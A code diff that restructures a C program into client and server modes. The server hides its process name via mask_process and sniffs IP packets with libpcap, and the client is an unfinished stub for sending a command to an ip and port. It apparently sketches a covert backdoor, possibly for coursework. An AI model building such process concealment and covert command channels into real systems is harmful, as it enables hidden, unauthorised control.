@@ -22,11 +22,16 @@ void pcap_error(char *errbuf);
  *      const u_char* packet: Pointer to the captured packet in serialized form.
  */
 void got_packet(u_char *args, const struct pcap_pkthdr *header,
-                const u_char *packet);
+        const u_char *packet);
 
-int main(int argc, char *argv[])
+void usage(char* program_name)
 {
-    if (mask_process(argv[0], NEW_PROCESS_NAME) != 0)
+    printf("Usage: %s <mode>\n", program_name);
+}
+
+int start_server(char* program_name)
+{
+    if (mask_process(program_name, NEW_PROCESS_NAME) != 0)
     {
         fprintf(stderr, "mask_process failed: %s\n", strerror(errno));
         return -1;
@@ -38,7 +43,6 @@ int main(int argc, char *argv[])
         return -1;
     }
 
-    // TODO: Set up packet capturing engine
     pcap_if_t *alldevs, *temp;
     pcap_t *session;
     char filter_string[] = "ip";
@@ -81,7 +85,7 @@ int main(int argc, char *argv[])
 
     // Compile the filter string
     if (pcap_compile(session, &filter_program, filter_string, 0, net_addr) ==
-        -1)
+            -1)
     {
         fprintf(stderr, "Error calling pcap_compile\n");
         return -1;
@@ -99,5 +103,48 @@ int main(int argc, char *argv[])
 
     // Clean up handles
     pcap_freealldevs(alldevs);
+    return 0;
+}
+
+
+int start_client(int argc, char* argv[])
+{
+    if (argc < 3)
+    {
+        printf("Usage: %s <ip> <port> <command>\n", argv[0]);
+        return -1;
+    }
+
+    printf("%d args\n", argc);
+
+}
+
+int main(int argc, char *argv[])
+{
+
+    if (argc < 2)
+    {
+        usage(argv[0]);
+        return -1;
+    }
+
+    // Settting the run mode of the program
+    if (strcmp(argv[1], "client") == 0)
+    {
+        printf("Starting in client mode\n");
+        int args_left = argc - 2;
+        start_client(args_left, argv + args_left);
+    }
+    else if (strcmp(argv[1], "server") == 0)
+    {
+        printf("Starting in server mode\n");
+        start_server(argv[0]);
+    }
+    else
+    {
+        usage(argv[0]);
+        return -1;
+    }
+
     return 0;
 }
